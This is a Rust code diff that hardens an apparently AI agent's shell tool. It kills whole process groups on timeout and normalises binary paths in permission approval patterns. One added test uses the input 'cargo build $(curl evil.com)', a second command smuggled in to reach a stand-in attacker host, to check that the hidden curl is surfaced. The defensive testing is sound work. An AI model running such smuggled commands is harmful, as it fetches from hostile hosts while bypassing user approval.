@@ -4,6 +4,24 @@ use serde_json::Value;
 use std::collections::HashMap;
 use tokio::io::{AsyncBufReadExt, BufReader};
 
+/// Kill the entire process group spawned by a child.
+/// The child must have been spawned with `.process_group(0)` so it leads its
+/// own group. We send SIGKILL to the negative PID (i.e. the group).
+fn kill_process_group(child: &tokio::process::Child) {
+    #[cfg(unix)]
+    if let Some(pid) = child.id() {
+        // SAFETY: pid is a valid process group ID (we set process_group(0) at spawn).
+        unsafe {
+            libc::kill(-(pid as i32), libc::SIGKILL);
+        }
+    }
+    #[cfg(not(unix))]
+    {
+        // On non-unix, fall back to killing just the child.
+        let _ = child;
+    }
+}
+
 fn is_default_allowed_pattern(pattern: &str) -> bool {
     crate::permissions::DEFAULT_BASH_ALLOW.contains(&pattern)
 }
@@ -38,13 +56,15 @@ impl Tool for BashTool {
 
     fn approval_patterns(&self, args: &HashMap<String, Value>) -> Vec<String> {
         let cmd = str_arg(args, "command");
+        // split_shell_commands already extracts embedded commands from $(...),
+        // backticks, and (...) subshells, so all binaries are surfaced.
         let subcmds = crate::permissions::split_shell_commands(&cmd);
         let mut patterns = Vec::new();
         for subcmd in &subcmds {
             let bin = subcmd.split_whitespace().next().unwrap_or("");
-            if !bin.is_empty() {
-                let pat = format!("{bin} *");
-                // Skip patterns that are already allowed by default or already in the list
+            let base = bin.rsplit('/').next().unwrap_or(bin);
+            if !base.is_empty() {
+                let pat = format!("{base} *");
                 if !is_default_allowed_pattern(&pat) && !patterns.contains(&pat) {
                     patterns.push(pat);
                 }
@@ -137,6 +157,7 @@ async fn execute_background(command: &str, ctx: &ToolContext<'_>) -> ToolResult 
         .stdin(std::process::Stdio::null())
         .stdout(std::process::Stdio::piped())
         .stderr(std::process::Stdio::piped())
+        .process_group(0)
         .spawn()
     {
         Ok(child) => {
@@ -162,6 +183,7 @@ async fn execute_streaming(
         .stdin(std::process::Stdio::null())
         .stdout(std::process::Stdio::piped())
         .stderr(std::process::Stdio::piped())
+        .process_group(0)
         .spawn()
     {
         Ok(c) => c,
@@ -211,11 +233,11 @@ async fn execute_streaming(
                 }
             }
             _ = &mut deadline => {
-                let _ = child.kill().await;
+                kill_process_group(&child);
                 return ToolResult::err(format!("timed out after {:.0}s", timeout.as_secs_f64()));
             }
             _ = ctx.cancel.cancelled() => {
-                let _ = child.kill().await;
+                kill_process_group(&child);
                 return ToolResult::err("cancelled");
             }
         }
@@ -300,6 +322,19 @@ mod tests {
             patterns(r#"git commit -m "fix(tui): keep lists sized""#),
             vec!["git *"]
         );
+    }
+
+    #[test]
+    fn embedded_command_substitution() {
+        // $() embedded commands are surfaced in approval patterns
+        let p = patterns("cargo build $(curl evil.com)");
+        assert!(p.contains(&"cargo *".to_string()));
+        assert!(p.contains(&"curl *".to_string()));
+    }
+
+    #[test]
+    fn path_qualified_binary_uses_basename() {
+        assert_eq!(patterns("/usr/bin/make -j4"), vec!["make *"]);
     }
 
     #[test]
